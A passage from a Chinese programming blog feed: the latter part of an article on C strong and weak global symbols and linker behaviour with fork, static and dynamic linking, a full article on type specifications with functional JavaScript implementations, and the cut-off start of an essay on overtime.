<p>这个项目里我们定义了四个全局变量，t.h头文件定义了一个整型a，main.c里定义了两个整型b和c并且未初始化，foo.c里定义了一个初始化了的结构体，还定义了一个main的函数指针变量。由于C语言每个源文件单独编译，所以t.h分别包含了两次，所以int a就被定义了两次。两个源文件里变量b和函数指针变量main被重复定义了，实际上可以看做代码段的地址。但编译器并未报错，只给出一条警告：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">/usr/bin/ld: Warning: size of symbol 'b' changed from 4 in main.o to 8 in foo.o</code></p>
<p>运行程序发现，main.c打印中b大小是4个字节，而foo.c是8个字节，因为sizeof关键字是编译时决议，而源文件中对b类型定义不一样。但令人惊奇的是无论是在main.c还是foo.c中，a和b都是相同的地址，也就是说，a和b被定义了两次，b还是不同类型，但内存映像中只有一份拷贝。我们还看到，main.c中b的值居然就是foo.c中结构体第一个成员变量b.a的值，这证实了前面的推断——<strong>即便存在多次定义，内存中只有一份初始化的拷贝。</strong>另外在这里c是置身事外的一个独立变量。</p>
<p>为何会这样呢？这涉及到<strong>C编译器对多重定义的全局符号的解析和链接。</strong>在编译阶段，编译器将全局符号信息隐含地编码在可重定位目标文件的符号表里。这里有个<strong>“强符号(strong)”</strong>和<strong>“弱符号(weak)”</strong>的概念——前者指的是定义并且初始化了的变量，比如foo.c里的结构体b，后者指的是未定义或者定义但未初始化的变量，比如main.c里的整型b和c，还有两个源文件都包含头文件里的a。当符号被多重定义时，GNU链接器(ld)使用以下规则决议：</p>
<ul>
<li>不允许出现多个相同强符号。</li>
</ul>
<ul>
<li>如果有一个强符号和多个弱符号，则选择强符号。</li>
</ul>
<ul>
<li>如果有多个弱符号，那么先决议到size最大的那个，如果同样大小，则按照链接顺序选择第一个。</li>
</ul>
<p>像上面这个例子中，全局变量a和b存在重复定义。如果我们将main.c中的b初始化赋值，那么就存在两个强符号而违反了规则一，编译器报错。如果满足规则二，则仅仅提出警告，实际运行时决议的是foo.c中的强符号。而变量a都是弱符号，所以只选择一个（按照目标文件链接时的顺序）。</p>
<p>事实上，这种规则是C语言里的一个大坑，编译器对这种全局变量多重定义的“纵容”很可能会无端修改某个变量，导致程序不确定行为。如果你还没有意识到事态严重性，我再举个例子。</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>第二个例子<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* foo.c */
#include &lt;stdio.h&gt;;

struct {
    int a;
    int b;
} b = { 2, 4 };

int main();

void foo()
{
    printf("foo:\t(&amp;b)=0x%08x\n\tsizeof(b)=%d\n
        \tb.a=%d\n\tb.b=%d\n\tmain:0x%08x\n",
        &amp;b, sizeof b, b.a, b.b, main);
}

/* main.c */
#include &lt;stdio.h&gt;

int b;
int c;

int main()
{
    if (0 == fork()) {
        sleep(1);
        b = 1;
        printf("child:\tsleep(1)\n\t(&amp;b):0x%08x\n
            \t(&amp;c)=0x%08x\n\tsizeof(b)=%d\n\tset b=%d\n\tc=%d\n",
            &amp;b, &amp;c, sizeof b, b, c);
        foo();
    } else {
        foo();
        printf("parent:\t(&amp;b)=0x%08x\n\t(&amp;c)=0x%08x\n
            \tsizeof(b)=%d\n\tb=%d\n\tc=%d\n\twait child...\n",
            &amp;b, &amp;c, sizeof b, b, c);
        wait(-1);
        printf("parent:\tchild over\n\t(&amp;b)=0x%08x\n
            \t(&amp;c)=0x%08x\n\tsizeof(b)=%d\n\tb=%d\n\tc=%d\n",
            &amp;b, &amp;c, sizeof b, b, c);
    }
    return 0;
}</pre>
<p>运行情况如下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">foo:	(&amp;b)=0x0804a020
	sizeof(b)=8
	b.a=2
	b.b=4
	main:0x080484c8
parent:	(&amp;b)=0x0804a020
	(&amp;c)=0x0804a034
	sizeof(b)=4
	b=2
	c=0
	wait child...
child:	sleep(1)
	(&amp;b):0x0804a020
	(&amp;c)=0x0804a034
	sizeof(b)=4
	set b=1
	c=0
foo:	(&amp;b)=0x0804a020
	sizeof(b)=8
	b.a=1
	b.b=4
	main:0x080484c8
parent:	child over
	(&amp;b)=0x0804a020
	(&amp;c)=0x0804a034
	sizeof(b)=4
	b=2
	c=0
</pre>
<p>（说明一点，运行情况是直接输出到stdout的打印，笔者曾经将./test输出重定向到log中，结果发现打印的执行序列不一致，所以采用默认输出。）</p>
<p>这是一个<strong>多进程环境</strong>，首先我们看到无论父进程还是子进程，main.c还是foo.c，全局变量b和c的地址仍然是一致的（当然只是个<strong>逻辑地址</strong>），而且对b的大小不同模块仍然有不同的决议。这里值得注意的是，我们在子进程中对变量b进行赋值动作，从此子进程本身包括foo()调用中，整型b以及结构体成员b.a的值都是1，而父进程中整型b和结构体成员b.a的值仍是2，但它们显示的逻辑地址仍是一致的。</p>
<p>个人认为可以这样解释，fork创建新进程时，子进程获得了父进程上下文“镜像”（自然包括全局变量），虚拟地址相同但属于不同的进程空间，而且此时真正映射的物理地址中只有一份拷贝，所以b的值是相同的（都是2）。随后子进程对b改写，触发了操作系统的<strong>写时拷贝(copy on write)</strong>机制，这时物理内存中才产生真正的两份拷贝，分别映射到不同进程空间的虚拟地址上，但虚拟地址的值本身仍然不变，这对于应用程序来说是透明的，具有隐瞒性。</p>
<p>还有一点值得注意，这个示例编译时没有出现第一个示例的警告，即对变量b的sizeof决议，笔者也不知道为什么，或许是GCC的一个bug？</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%89%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>第三个例子<span class="ez-toc-section-end"></span>
</h4>
<p>这个例子代码同上一个一致，只不过我们将foo.c做成一个静态链接库libfoo.a进行链接，这里只给出Makefile的改动。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">test: main.o foo.o
	ar rcs libfoo.a foo.o
	gcc -static -o test main.o libfoo.a

main.o: main.c
foo.o: foo.c

clean:
	rm -f *.o test
</pre>
<p>运行情况如下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">foo:	(&amp;b)=0x080ca008
	sizeof(b)=8
	b.a=2
	b.b=4
	main:0x08048250
parent:	(&amp;b)=0x080ca008
	(&amp;c)=0x080cc084
	sizeof(b)=4
	b=2
	c=0
	wait child...
child:	sleep(1)
	(&amp;b):0x080ca008
	(&amp;c)=0x080cc084
	sizeof(b)=4
	set b=1
	c=0
foo:	(&amp;b)=0x080ca008
	sizeof(b)=8
	b.a=1
	b.b=4
	main:0x08048250
parent:	child over
	(&amp;b)=0x080ca008
	(&amp;c)=0x080cc084
	sizeof(b)=4
	b=2
	c=0
</pre>
<p>从这个例子看不出有啥差别，只不过使用<strong>静态链接</strong>后，全局变量加载的地址有所改变，b和c的地址之间似乎相隔更远了些。不过这次编译器倒是给出了变量b的sizeof决议警告。</p>
<p>到此为止，有些人可能会对上面的例子嗤之以鼻，觉得这不过是列举了C语言的某些特性而已，算不上黑。有些人认为既然如此，对于一切全局变量要么用static限死，要么定义同时初始化，杜绝弱符号，以便在编译时报错检测出来。只要小心地使用，C语言还是很完美的嘛~对于抱这样想法的人，我只想说，请你在夜深人静的时候竖起耳朵仔细聆听，你很可能听到Dennis Richie在九泉之下邪恶的笑声——不，与其说是嘲笑，不如说是诅咒……</p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E5%9B%9B%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>第四个例子<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* foo.c */
#include &lt;stdio.h&gt;

const struct {
    int a;
    int b;
} b = { 3, 3 };

int main();

void foo()
{
    b.a = 4;
    b.b = 4;
    printf("foo:\t(&amp;b)=0x%08x\n\tsizeof(b)=%d\n
        \tb.a=%d\n\tb.b=%d\n\tmain:0x%08x\n",
        &amp;b, sizeof b, b.a, b.b, main);
}

/* t1.c */
#include &lt;stdio.h&gt;

int b = 1;
int c = 1;

int main()
{
    int count = 5;
    while (count-- &gt; 0) {
        t2();
        foo();
        printf("t1:\t(&amp;b)=0x%08x\n\t(&amp;c)=0x%08x\n
            \tsizeof(b)=%d\n\tb=%d\n\tc=%d\n",
            &amp;b, &amp;c, sizeof b, b, c);
        sleep(1);
    }
    return 0;
}

/* t2.c */
#include &lt;stdio.h&gt;

int b;
int c;

int t2()
{
    printf("t2:\t(&amp;b)=0x%08x\n\t(&amp;c)=0x%08x\n
        \tsizeof(b)=%d\n\tb=%d\n\tc=%d\n",
        &amp;b, &amp;c, sizeof b, b, c);
    return 0;
}</pre>
<p>Makefile脚本：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">export LD_LIBRARY_PATH:=.

all: test
	./test

test: t1.o t2.o
	gcc -shared -fPIC -o libfoo.so foo.c
	gcc -o test t1.o t2.o -L. -lfoo

t1.o: t1.c
t2.o: t2.c

.PHONY:clean
clean:
	rm -f *.o *.so test*
</pre>
<p>执行结果：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">./test
t2:	(&amp;b)=0x0804a01c
	(&amp;c)=0x0804a020
	sizeof(b)=4
	b=1
	c=1
foo:	(&amp;b)=0x0804a01c
	sizeof(b)=8
	b.a=4
	b.b=4
	main:0x08048564
t1:	(&amp;b)=0x0804a01c
	(&amp;c)=0x0804a020
	sizeof(b)=4
	b=4
	c=4
t2:	(&amp;b)=0x0804a01c
	(&amp;c)=0x0804a020
	sizeof(b)=4
	b=4
	c=4
foo:	(&amp;b)=0x0804a01c
	sizeof(b)=8
	b.a=4
	b.b=4
	main:0x08048564
t1:	(&amp;b)=0x0804a01c
	(&amp;c)=0x0804a020
	sizeof(b)=4
	b=4
	c=4
	...</pre>
<p>其实前面几个例子只是开胃小菜而已，真正的大坑终于出现了！而且这次编译器既没报错也没警告，但我们确实眼睁睁地看到作为main()中强符号的b被改写了，而且一旁的c也“躺枪”了。眼尖的读者发现，这次foo.c是作为动态链接库运行时加载的，当t1第一次调用t2时，libfoo.so还未加载，一旦调用了foo函数，b立马中弹，而且<strong>c的地址居然还相邻着b，这使得c一同中弹了。</strong>不过笔者有些无法解释这种行为的原因，有种说法是强符号的全局变量在数据段中是连续分布的（相应地弱符号暂存在.bss段或者符号表里），或许可以上报GNU的编译器开发小组。</p>
<p>另外笔者尝试过将t1.c中的b和c定义前面加上<strong>const限定词</strong>，编译器仍然默认通过，但程序在main()中第一次调用foo()时触发了Segment fault异常导致奔溃，在foo.c里使用指针改写它也一样。<strong>推断这是GCC对const常量所在地址启用了类似操作系统写保护机制，但我无法确定早期版本的GCC是否会让这个const常量被改写而程序不会奔溃。</strong></p>
<p>至于<strong>volatile关键词</strong>之于全局变量，自测似乎没有影响。</p>
<p>怎么样？看了最后一个例子是否有点“不明觉厉”呢？C语言在你心目中是否还是当初那个“纯洁”、“干净”、“行为一致”的姑娘呢？也许趁着你不注意的时候她会偷偷给你戴顶绿帽，这一切都是通过全局变量，特别在动态链接的环境下，就算全部定义成强符号仍然无法为编译器所察觉。而一些IT界“恐怖分子”也经常<strong>将恶意代码包装成全局变量注入到root权限下存在漏洞的操作序列中，</strong>就像著名的栈溢出攻击那样。某一天当你傻傻地看着一个程序出现未定义的行为却无法定位原因的时候，请不要忘记Richie大爷那来自九泉之下最深沉的“问候”~</p>
<p>或许有些人会偷换概念，把这一切归咎于编译器和链接器身上，认为这同语言无关，但我要提醒你，正是编译/链接器的行为支撑了整个语言的语法和语义。你可以反过来思考一下为何C的胞弟C++推出<strong>“命名空间(namespace)”</strong>的概念，或者你可以使用其它高级语言，对于重定义的全局变量是否能通过编译这一关。</p>
<p>所以请时刻谨记，<span style="color: #ff0000;"><strong>C是一门很恐怖的语言！</strong></span></p>
<p>P.S.题外话写在最后。我无意挑起语言之争，只是就事论事地去<strong>“黑(hack)</strong><strong>”</strong>一门语言而已，而且要黑就要黑得有理有力有层次，还要带点娱乐精神。其实黑一门语言并非什么尖端复杂的技术，个人觉得起码要做到两点：</p>
<ul>
<li>
<strong>亲自动手写测试程序。</strong>动手写测试程序是开发人员必备的基础技能，只有现成的代码才能让人心服口服，那些只会停留在口头上的争论只能算作cheap hack。</li>
</ul>
<ul>
<li>
<strong>测试程序不能依赖于不成熟的代码。</strong>软件开发99%以上的bug都是基于不合格(substandard)开发人员导致，这并不能怪罪于语言以及编译器本身。使用诸如#define TRUE FALSE或者#define NULL 1之类的trick来黑C语言只能证明此人很有娱乐精神而不是真正的”hack value”，拿老北京梨园行当里的一句话——“那是下三滥的玩意儿”。</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-21T21:16:33+08:00</pubDate>
<guid>https://coolshell.cn/articles/10115.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 类型的本质和函数式实现 ]]></title>
<link>https://coolshell.cn/articles/10169.html</link>
<content><![CDATA[ 
<p><strong>（感谢 </strong><a href="https://weibo.com/weidagang" target="_blank">@文艺复兴记</a><strong>（todd） 投递此文）</strong></p>
<p>在上一篇文章<a href="https://coolshell.cn/articles/9886.html">《二叉树迭代器算法》</a>中，我介绍了一种基于栈的二叉树迭代器实现。程序设计语言和Haskell大牛<a href="https://weibo.com/u/1684815495">@九瓜</a> 在看过之后评论到：</p>
<blockquote><p>这里用了 stack 来做，有点偷懒，所以错失了一个抽象思考机会。如果我们能够理解二叉树到线性表的转换过程，完全可以把 Iterator 当作抽象的线性表来看，只要定义了关于 Iterator 的 empty, singleton, 还有 append 操作，实现二叉树的 Iterator 就变得非常直观。</p></blockquote>
<p>“错失了一个抽象思考机会”是什么意思呢？我理解九瓜的意思是基于栈的实现虽然是正确的，但它缺乏对于迭代器类型本质的理解，不具有通用性。如果能对迭代器进行合适地抽象就可以像二叉树递归遍历一样自然地得出二叉树迭代器，甚至其他更复杂的数据结构，只要我们能写出它的遍历算法，迭代器算法都可以自然推出。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%9C%AC%E8%B4%A8" title="类型的本质">类型的本质</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%87%BD%E6%95%B0%E5%BC%8F%E5%AE%9E%E7%8E%B0" title="类型的函数式实现">类型的函数式实现</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%87%BD%E6%95%B0%E5%BC%8F%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8" title="函数式二叉树迭代器">函数式二叉树迭代器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%9C%AC%E8%B4%A8"></span>类型的本质<span class="ez-toc-section-end"></span>
</h4>
<p>九瓜提到了通过empty, singleton和append操作对Iterator进行抽象，我本来打算直接根据这个思路介绍函数式的二叉树迭代器实现，但是考虑到其实首要的问题在于理解类型的本质，而并不是所有人都具备这个基础，不如先普及一下类型基础再进入具体实现。那么下面我们就先来认识一下类型到底是什么？我们先以来看看表示元素对的Pair类型，可能有人一提到Pair类型马上就会在脑海中浮现出下面的结构：</p>
<p><span id="more-10169"></span></p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">struct Pair {
    int left;
    int right;
}
</pre>
<p>其实，这种理解是非本质的，Pair完全可以用2个元素的数组来表示，第一个元素表示left，第二个元素表示right：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">struct Pair {
    int elements[2];
}
</pre>
<p>上面的两种不同表示是类型的不同实现，而<strong>类型的本质是由操作(Operation)和操作间的关系或不变式(Invariant)所定义的</strong>，我们称之为类型规范(Type Specification)。比如，Pair类型是这样定义的：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">Type Pair:
    Operations:
        Pair make_pair(int x, int y)
        int get_left(Pair pair)
        int get_right(Pair pair)
    Invariants:
        get_left(make_pair(x, y)) == x  //对x, y构造的Pair取左元素等于x
        get_right(make_pair(x, y)) == y  //对x, y构造的Pair取右元素等于y
</pre>
<p>也就是说只要是满足Pair类型规范，即定义了make_pair，get_left, get_right这3种操作，并且这些操作满足上面两个不变式，那么它这就是Pair类型。我们再来看看稍微复杂一点的Stack类型：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">Type Stack:
    Operations:
        Stack make_stack()  //构造空栈
        Stack push(Stack stack, int x)  //将元素x压栈，返回新栈
        int top(stack)  //获取栈顶元素
        Stack pop(Stack stack)  //将栈顶元素弹栈，返回新栈
    Invariants:
        top(push(stack, x)) == x  //栈顶元素为最后一次压栈值
        pop(push(stack, x)) == stack  //对stack压栈后再弹栈等于原来的stack
</pre>
<p>Stack类型规范简言之就是FILO（先入后出），如果要形式化就是上面的不变式。为了加深理解，我们现在切换到测试视角来看一看，如果请你来编写一个Stack类的单元测试用例，你应该怎么写呢？许多朋友都不清楚单元测试到底测什么？怎么测？我见过不少人用一个测试用例单独对push做测试，用另一个测试用例对pop单独做测试，其主要原因就在于缺乏对类型本质的理解。其实，只要理解了类型的本质我们就知道孤立地看push或pop是没有任何意义的，它们的意义是在FILO关系下相互解释的，所以测试当然是基于类型规范来测试FILO不变式！这种基于类型规范的测试是一种黑盒测试，与类型的内部实现细节无关，只要单元测试覆盖了类型所定义的所有操作和不变式，那么不管内部怎么实现或优化，测试用例都不需要调整。反之，如果深入到了类型的内部实现做白盒测试，那这样的测试用例实际上就不再是反映其类型规范了，它会随着实现细节的调整而失效。</p>
<p>更深一层来看，不仅是在Pair，Stack这样的微观层面，在一个系统的宏观层面同样可以采用类型视角，即考察系统定义了哪些操作？这些操作之间有什么样的关系或不变式？比如，你如何从类型的角度来看待MySQL这样一套数据库系统？MySQL系统定义了哪些操作？这些操作之间必须满足怎样的关系和不变式？不仅如此，类型视角除了可以应用于计算机系统，甚至还可以应用于生活中的事物，比如，你到超市购物可以寄存自己的包，在寄包的时候会获得一张密码条，取包时可以通过密码条打开箱子。你能从超市寄包这个例子中看出类型来吗？如果你看出来了，说明你对类型的理解真正融会贯通了！</p>
<h4>
<span class="ez-toc-section" id="%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%87%BD%E6%95%B0%E5%BC%8F%E5%AE%9E%E7%8E%B0"></span>类型的函数式实现<span class="ez-toc-section-end"></span>
</h4>
<p>上面我们介绍了类型的本质在于操作和操作间的关系，下面我们要关注的是类型的实现。在上面的例子中，Pair的内部结构到底是什么，是一个left和一个right成员？还是一个两元素的数组？没有讲，也没关系，就好像Windows的Handle和Linux的FileDescriptor一样，它们都是一个标识，你并不需要关心它的值本身，你只需要用几个相关的函数创建和操作它就行了（上面超市寄包例子中的密码条和Windows中的Handle是什么关系，你看出来了吗？你需要理解密码条的内容吗？）。换句话说，只要满足类型规范，具体实现是可变的，使用者<strong>只依赖于类型规范而不依赖于其具体实现</strong>。这在面向对象语言中意味着接口保持不变而具体实现可以变化（这里把public方法视为一种广义的接口）。</p>
<p>下面，我们还会看到的是不仅类型的内部实现可以变化，而且可以根本没有什么所谓的内部实现。这是什么意思呢？让我们来思考一下，是不是Pair内部一定要有什么东西来保存构造函数传入的left和right？我们能跳出这个定势吗？在函数式编程中，我们能做到：</p>
<p>[javascript]<br>
//Javascript<br>
function make_pair(x, y) {<br>
// 返回一个支持get_left和get_right操作的闭包(Closure)<br>
return {<br>
get_left : function() { return x },<br>
get_right : function() { return y }<br>
}<br>
}<br>
function get_left(pair) {<br>
return pair.get_left();<br>
}<br>
function get_right(pair) {<br>
return pair.get_right();<br>
}<br>
// Test case<br>
console.log(get_left(make_pair(1, 2))) //1<br>
console.log(get_right(make_pair(1, 2))) //2<br>
[/javascript]</p>
<p>上面的关键代码在于make_pair的内部返回的不是一种具体的数据结构，而是一个支持get_left和get_right操作的闭包(Closure)，将来可以通过get_left和get_right来提取x, y。这种基于闭包的实现和我们通常采用的基于数据结构的实现的本质区别在哪里呢？不难发现，<strong>基于闭包的实现和类型规范是直接对应的</strong>，它并没有引入类型规范之外的东西，而基于数据结构的实现则隐藏了实现的细节。换句话说，如果要验证实现代码的正确性，对于前者只需要比对着类型规范，对于后者我们可能需要去仔细理解推敲其所采用的数据结构。对于Pair这样简单的结构二者差别不大，甚至基于数据结构的实现更简单，但是对于复杂的类型就容易体现出闭包实现的优势了。为了加深理解，我们再来看一个Stack的函数式实现：</p>
<p>[javascript]<br>
//Javascript<br>
function make_stack() {<br>
return null<br>
}<br>
function push(stack, x) {<br>
return {<br>
top : function() { return x },<br>
pop : function() { return stack }<br>
}<br>
}<br>
function top(stack) {<br>
return stack.top()<br>
}<br>
function pop(stack) {<br>
return stack.pop()<br>
}<br>
// Test case<br>
var stack = make_stack()<br>
stack = push(stack, 1)<br>
stack = push(stack, 2)<br>
stack = push(stack, 3)<br>
console.log(top(stack)) //3<br>
stack = pop(stack)<br>
console.log(top(stack)) //2<br>
stack = push(stack, 4)<br>
console.log(top(stack)) //4<br>
[/javascript]</p>
<p>上面的所有函数都是采用了无副作用的纯函数式设计，可能习惯面向对象编程的朋友不是很习惯，不过这不影响我们对类型的讨论，而且它也很容易改造成面向对象的风格，感兴趣的朋友可以自己尝试对上面的代码进行简单的包装让它看起来像面向对象的样子。</p>
<h4>
<span class="ez-toc-section" id="%E5%87%BD%E6%95%B0%E5%BC%8F%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8"></span>函数式二叉树迭代器<span class="ez-toc-section-end"></span>
</h4>
<p>上面我们介绍了类型的本质和函数式实现，下面我们再来看看Iterator类型又该如何定义和实现呢？ 思路当然还是从操作入手，考虑Iterator类型对应了哪些操作，它们的关系是什么？上面九瓜提示了Iterator类型可以抽象为线性表List类型，或者说Iterator本质上是一个List。为什么呢？其实，只要跳出“如何表示数据结构”的思维，从类型角度思考就很容易理解，因为Iterator和List都定义了相同的操作，Iterator的使用者完全不关心也不知道它背后到底是链表还是二叉树，你对Iterator的操作和一个List的操作完全一样。正是这个原因，STL等范型库才能通过Iterator将算法和数据结构解耦。</p>
<p>怎么定义一个List类型呢？九瓜提到的empty(), singleton()和append()实际上就是和List打交道最多的Lisp语言的经典定义方式。Lisp是基于s-expression的，s-expression既可以视为线性表又可以视为树，本质上Lisp为List类型了构造、取首元素和取剩余元素等几种操作：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">Type List:
    Operations:
        List empty()  //构造空表，通常由()这个文字量表示
        List singleton(Element e)  //构造包含一个元素的表，通常由(e)这个文字量表示
        Element first(List list)   //取list的第一个元素，通常又叫car操作
        List rest(List list)  //取list除第一个元素外的剩余部分，通常又叫cdr操作
        List append(List list1, List list2) //连接两个表
    Invariants:
        append(empty(), list) == list  //空表和表list连接后等于表list
        append(list, empty()) == list  //空表和表list连接后等于表list
        first(singleton(e)) == e  //对singleton(e)取首元素等于e
        rest(singleton(e)) == empty()  //对singleton(e)取首元素外的剩余部分的结果为空表
        append(first(list), rest(list)) == list  //对list的首尾两部分进行连接等于list本身
        if list1 is not empty then
            first(append(list1, list2)) == first(list1)  //对非空表list1于表list2的连接取首元素等于对非空表list1取首元素
        if list1 is not empty then
            rest(append(list1, list2)) == append(rest(list1), list2)  //对非空表list1于表list2的连接取首元素等于对非空表list1取首元素
</pre>
<p>有了上面的分析，我们相应地写出下面的List实现：</p>
<p>[javascript]<br>
//Javascript<br>
function empty() {<br>
return null<br>
}<br>
function singleton(e) {<br>
return {<br>
first: function() { return e },<br>
rest: function() { return null }<br>
}<br>
}<br>
function first(list) {<br>
return list.first()<br>
}<br>
function rest(list) {<br>
return list.rest()<br>
}<br>
function append(list1, list2) {<br>
if (null == list1) return list2<br>
if (null == list2) return list1</p>
<p> return {<br>
first : function() { return first(list1) },<br>
rest : function() { return append(rest(list1), list2) }<br>
}<br>
}<br>
[/javascript]</p>
<p>在此基础上可以进一步实现二叉树迭代器：</p>
<p>[javascript]<br>
function make_binary_tree_iterator(node) {<br>
return {<br>
first : function() {<br>
return null != node.left ? first(make_binary_tree_iterator(node.left)) : node<br>
},<br>
rest : function() {<br>
var left_it = (null == node.left ? null : make_binary_tree_iterator(node.left))<br>
var root_it = singleton(node)<br>
var right_it = (null == node.right ? null : make_binary_tree_iterator(node.right))<br>
var it = append(append(left_it, root_it), right_it)<br>
return rest(it)<br>
}<br>
}<br>
}<br>
//======== Test case ========<br>
var tree = {<br>
value : 1,<br>
left : {<br>
value : 2,<br>
left : { value : 4, left : null, right : null },<br>
right : null<br>
},<br>
right : {<br>
value : 3,<br>
left : null,<br>
right : { value : 7, left : null, right : null }<br>
}<br>
}<br>
for (var it = make_binary_tree_iterator(tree); null != it; it = rest(it)) {<br>
console.log(first(it).value)<br>
}<br>
[/javascript]</p>
<p>上面的make_binary_tree_iterator在List类型的基础上按照二叉树遍历过程构造了一个List。不知道你是否注意到了，为什么它不像下面这个例子一样直接返回一个List，而要构造一个闭包呢？</p>
<p>[javascript]<br>
function make_binary_tree_iterator(node) {<br>
var left_it = (null == node.left ? null : make_binary_tree_iterator(node.left))<br>
var root_it = singleton(node)<br>
var right_it = (null == node.right ? null : make_binary_tree_iterator(node.right))<br>
return append(append(left_it, root_it), right_it)<br>
}<br>
[/javascript]</p>
<p>这里关键的区别在于闭包是惰性求值的，也就是说只有当真正开始迭代遍历的时候才会逐渐对各个函数进行求值，而上面的函数递归调用是非惰性的，会从一开始就把所有结点展开成线性表。如果你对这一点还不能很好地理解，可以尝试在各个函数中加log跟踪函数的调用过程。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>本文介绍了类型的本质在于它所定义的操作以及操作之间的关系和不变式。类型的实现关键在于满足类型规范的要求，而具体实现是可以变化的，使用者和测试用例都应该只依赖于类型规范而不依赖于具体实现。函数式的类型实现往往和类型规范是直接对应的，简单通用，但可能有性能问题，而命令式的类型实现往往会引入复杂的内部数据结构，但是其优点是高效。这两种实现并不是完全互斥的，有时候可以将二者相结合达到简单与高效的结合。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-22T19:46:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/10169.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 加班与效率 ]]></title>
<link>https://coolshell.cn/articles/10217.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >微博上看到了<a href="https://weibo.com/1401880315/A0LFVkB3L" target="_blank">这么一个贴子</a>，就像以前在《<a title="腾讯，竞争力 和 用户体验" href="https://coolshell.cn/articles/5901.html" target="_blank">腾讯，竞争力 和 用户体验</a>》中批评过腾讯说自己的核心竞争力是员工加班一样，我顺着Winter的回复也批评了一下这个微博——</p>
<p style="padding-left: 30px;">“<span style="color: #808080;">靠加班超越对手？！劳动密集型么？我要是对手的话，我就来趁机挖人了，直接摁死你……//<a href="https://weibo.com/n/%E5%AF%92%E5%86%ACwinter"><span style="color: #808080;">@寒冬winter</span></a>: 当一个管理者的智慧无法衡量一支团队的产出的时候，他就会把“工时”当做最后的救命稻草，死死抱住——这是他唯一听得懂的东西了</span>。”</p>
<p><img alt="image placeholder" ></p>
<p>然后，<a title="玄了个澄的" href="https://weibo.com/jiach">@玄了个澄的</a>在微博里at我说，他在微信里看了<a href="https://weibo.com/n/Fenng">@Fenng</a> 关于加班的言论，希望我评论一下。我看了一下大辉的文章，虽然写得有点散乱，但是我和他的一些观点还是很类似的，我主要在这里加强一下我的看法。</p>
<h4>关于加班</h4>
<p><strong>认为加班是公司的核心竞争力，或是超越对手的手段，是一种相当 Ridiculous 的想法。这说明管理者们已经想不到自己公司的核心价值了</strong>。</p>
<p><span id="more-10217"></span></p>
<p>是的，这些靠堆功能没有灵魂的产品的价值就只剩下比谁跑得快了。他们愚蠢和思维有限的大脑里已经区分不出来，“跑得快”和“跑得好”的差别了。产品的发展不是短跑，而是长跑，甚至更像是登山，登山比的不是快，而比的是策略，比的是意志，目的是登顶。并不是谁一开始爬得快谁就能最先登顶的，你往往被超越的时候都在后半程。对于一些危险的雪山来说，登顶的人通常都是要做好非常很充分的准备，并且在登山的过程中学会如何保留体力，学会如何步步为营的，从来不强行登顶。</p>
<p>在<a title="《Rework》摘录及感想" href="https://coolshell.cn/articles/9156.html">《Rework》摘录及感想</a> 中提到过两点</p>
<ul>
<li>
<strong>条件受限是好事，因为条件受限可以让你小材大用，让你没有办法再用蛮力来完成工作，让你必需去思考使用知识密集型的解决方案来更聪明的解决问题</strong>。</li>
</ul>
<ul>
<li>
